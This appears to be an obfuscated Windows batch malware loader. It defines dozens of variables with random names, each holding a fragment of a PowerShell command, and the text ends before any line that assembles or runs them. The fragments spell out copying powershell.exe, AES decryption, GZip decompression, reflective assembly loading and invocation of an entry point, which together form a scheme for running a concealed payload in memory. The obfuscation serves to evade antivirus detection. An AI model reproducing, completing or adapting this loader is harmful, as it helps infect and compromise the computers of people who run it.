@echo off
set "NtLRXZIElt=ow"
set "rojTJPSIHN=y "
set "fkHEoiIVuu=rS"
set "THPnFiUPBa=we"
set "dgVCfpJNTR=Wi"
set "HeCzzQKHgO=em"
set "qeQAMnLjwZ=do"
set "BsSiBBZRkF=rs"
set "YpaGyWzwzT=he"
set "PbmFlGkLIq=ll"
set "GdNxmsyYbf= C"
set "hzZTaWnKyA=0\"
set "wQELelsMWn=co"
set "reDEuzikrW=s\"
set "vVwJRVOnlI=ws"
set "deFmpEiGLt=in"
set "aZLkCmZzgB=\v"
set "PUvcXJbvPH=he"
set "VnmAoschzM=nd"
set "dzRLtQikAK=po"
set "JBoolJadng=we"
set "QqaULuBIQp=xe"
set "jSPCdcoAHW=32"
set "aiWXfOfieJ=ll"
set "wHdvKenCmz=Po"
set "pYxCoiHkmO=:\"
set "wriSJYmMqV=1."
set "XghzCZpPty=py"
set "fALzbJvdFf=st"
set "kDEtqAfnXV= /"
set "JLfkkbMXoW=Sy"
set "nLpooRtdDK=\W"
set "WjwsYKGJkR=.e"
set "BStMcIMjXR=cd"
set "ZEyKhquUMM= %~dp0"
set "QZMTaiWEFU=ach "
set "LPYzPuBctT=]::C"
set "BRVRKFIoqk=($BC"
set "UjOidZaCmq=daeR"
set "IrfVoXDwoy=nage"
set "LggvlFcBpt=.Cry"
set "aDLkTskVcj=NEmF"
set "ENeCMTZjOJ=Mode"
set "WtKYLyxWCn=.Mem"
set "TtqscFXzkc=oArr"
set "tzoZhmvFZo=gsYZ"
set "PsakyxZqzT=)))"
set "PAFkhRpyrS=un ="
set "ijJDHJNEyl=onve"
set "DwYTiSbgZW=)) {"
set "NFZoVWSpts=Comp"
set "ireYFafpUx=rtS4"
set "PhTEeXSYTj=[]] "
set "aIfqTjWkcU=ay()"
set "RrMbSGzPog=rity"
set "SArMwIjaKt=$wTR"
set "iwTfINdkVX=TllA"
set "WyEAqXAmKT=stem"
set "ToSAQvLoaZ=[Sys"
set "fYQqiLHUrS=]::("
set "fCXSQsaDSy=;$wQ"
set "ZCBSydmiWc=qa.T"
set "FUAgIEQOTi=trea"
set "onbVZpAjPo= [st"
set "ecdauaOZlt='txe"
set "UsWGTukAKO=ose("
set "HBlMLXMmMh=ddin"
set "EWTnwIEZic=wTRQ"
set "mtZIgXYGdq=ment"
set "WpYmpxIcIw=, (,"
set "ejOnditwOY=em.C"
set "MsNuiBaHGk=AI.I"
set "VBvqCgkCmD=U = "
set "PNOiNDpOQf=em.I"
set "kvuuJciToq=Secu"
set "AQpLIDPpwU=mfuU"
set "UQfdXHqTxM=yTo("
set "aazQdUAzQJ=.-16"
set "HwIVExzmEM=ert]"
set "JNEBgPUstz=ss -"
set "UGovwcStuO=tem."
set "ATzaWUkOGA=ing("
set "YNvcldyrqO=);$z"
set "eDSLZYytaq=[Env"
set "cNyjcLkKlx=tsWi"
set "VhOftkYSyX= '')"
set "OLTazCcKWv===')"
set "DjktjkHIXD=brea"
set "QuXzRiXVGx=::De"
set "MYnjGGGtsn=:('g"
set "ctCNSfMSiP=Bmor"
set "UDwFcoQkDq=vert"
set "NposIuxxLu=).Sp"
set "wgCtTQGkoP= = $"
set "ypdIbsahai=TRQd"
set "tfGKHQdWiS=VDAI"
set "cAvPJqvBaU=sion"
set "WuQdDwwseN==');"
set "nRljHrMcMk=ke($"
set "xFqwXFcLLM=ptog"
set "nCRdVOOcHh=uU ="
set "MdsgsCoDNC=ateD"
set "QvGwvUsxcc= = ["
set "PyqINwKXdY=ring"
set "kOXHxGjmLg=form"
set "VjGJcXxgKm=-1.."
set "WdDFGizAUK=yste"
set "MJgEMcEkgu=mWqa"
set "JiENqgVGUs=[IO."
set "DceocdoYid=y.Ci"
set "WfTMDGHHIe=.Cop"
set "HggqUvHyGF=.Cry"
set "ufseIVnAVN=oin "
set "uenPbOOGKR=pose"
set "LDXGaEMWwp=$lmf"
set "IXakHqBPzo=null"
set "WjlcoZiTWB=urit"
set "lgXAeJGeNa=; };"
set "FqiflqFiih=:: '"
set "uXqqqWOGub=yste"
set "QmLZdKjUko=Sp.T"
set "eZylpOpzAy=Syst"
set "qiJpmtjThx=oL'["
set "uwOvTQLHqi=esMa"
set "HZEdESGAtc=eMVs"
set "qPGFaPWfFG=);$Y"
set "MfmUFKDuyb=ct S"
set "nBFKwUXLXD=embl"
set "ADuitNJyyC=ispo"
set "bTgOCmZOSB=xL, "
set "awguPCLvny=[Sys"
set "IWhxToifhP=);$z"
set "lgwVXLVFCE=6esa"
set "bkmMJDclqx=Star"
set "xdYTPixDOp=.IO."
set "YHcjnNkNNN=$YmW"
set "SpISYAbIuQ=sDwx"
set "maJEgLCZQr='0Pg"
set "soMMcDHvVc=tem."
set "eHbdVVJokl=pres"
set "wPLTmrbKqu=Conv"
set "ORmwxBorBt=)($Y"
set "KLVKqJoUFq=.Con"
set "nmheRxIvNi=-joi"
set "mSscJNmBmr=grap"
set "dBBqMjHFAr=wQnv"
set "wZzkQmTdpA=[Sys"
set "KnvsaLkvzT=oryS"
set "GksefQEYNS=..-1"
set "KZWkVAkwQZ=ddin"
set "kkzIxFIUSQ=Q.En"
set "bhiPaKqdyM=mory"
set "ljMpRMohPC=ress"
set "MgtTyEwTST=;$sD"
set "ePBlabUwhO='')("
set "FsaUGqrVGL=1..-"
set "rDccAPqiFx=3); "
set "rzKYXIuerI=ect "
set "rdzgAOOrfz=16] "
set "ZbmjvfjNIP=();$"
set "PNbfcevuQB=Obje"
set "SOWNMrubqW=BCEk"
set "ZKBiNdxvtV=Disp"
set "gcBdTxOmPw= = $"
set "sjkLYUsiyx=bjec"
set "itmoDDBhBE=comm"
set "bEBJkuwNXX=106u"
set "DtFJySfoQS=eam("
set "yGiXqskeYD=ptor"
set "knVgPofoxP=  $Y"
set "vuPlQxMzKi=;$iM"
set "AMXlnDrISc=$sDw"
set "CYVfbpLuCw=)($l"
set "AUfNQAiaRq=);$w"
set "BZwUFODtBv=;$iM"
set "fjgGLCHYuL=tem."
set "mlqdsBqUZi=d = "
set "cAsbojmDUz=($BC"
set "EhyRKcoeBx=ck($"
set "iBazxpQWxP=tryP"
set "wsqqFJeAVT=);$k"
set "eMSbBGZIuM= [Sy"
set "gxdhpEzREy=lit("
set "IdOWguMEaO=and "
set "SrvpirhkUg=ion."
set "SwYSybHFVA=morF"
set "HdxdlMPoAW=d;$z"
set "cFkdIxCuUg=.Mod"
set "AmrNcDaKfw=V = "
set "FAqcIvXgDJ=EkA."
set "FuGLhYcVGo=m.Re"
set "ZRpKNQJwvI=fore"
set "OIvmKhkUFO=ode]"
set "SxMMIuReqU=.Dis"
set "tAdAjVnYfM=.Com"
set "GaxoMPTsDv=-4] "
set "wXeVhVnVXu=1] -"
set "OiHYGycekO=gjYA"
set "RTsDUwmAxe= New"
set "SCmONrIfQM=$lmf"
set "CjJVUCWfHP=Disp"
set "eEPStKFddk=();$"
set "CTvgYQPZrQ=uSp "
set "MJUZIGLRxQ=RmAx"
set "HxHCZaZuOT=ecry"
set "TosUozffZL=[-1."
set "tLhLoqXtSa=Invo"
set "BVJdTEIJtg=nirt"
set "cpsFrfNmvq=stem"
set "ywICqUIvhh=s75K"
